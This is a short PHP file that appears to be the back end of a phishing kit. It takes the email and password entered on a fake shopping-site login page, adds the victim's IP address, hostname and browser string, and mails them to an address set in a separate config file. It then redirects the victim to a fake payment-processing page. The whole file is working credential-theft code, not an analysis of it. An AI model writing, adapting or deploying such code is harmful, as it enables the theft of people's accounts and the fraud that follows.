<?php
include("../config.php");
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$pes .= "------------+| It's now easier to shop |+------------\n";
$pes .= "Email                   : ".$_POST['iemawatson1']."\n";
$pes .= "Password               : ".$_POST['iemawatson2']."\n";
$pes .= "------------+| We offer free global returns with pick-up service. |+------------\n";
$pes .= "Fr0m $ip chek in http://www.geoiptool.com/?IP=$ip   \n";
$pes .= "System Down :  $useragent   \n";


$bilsub = "iCustomer LS $ip";
$bilhead = "From: Customer LS <prodection@bader.com>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead = "X-Mailer: PHP/".phpversion();
$bilhead .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$bilhead .= "MIME-Version: 2.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$pes,$bilhead);

header("Location: ../cne.php?Go=_Payment_loa_Processing&_SESSION=e699f2e63c610833cd33955a8014baff74bec256");
?>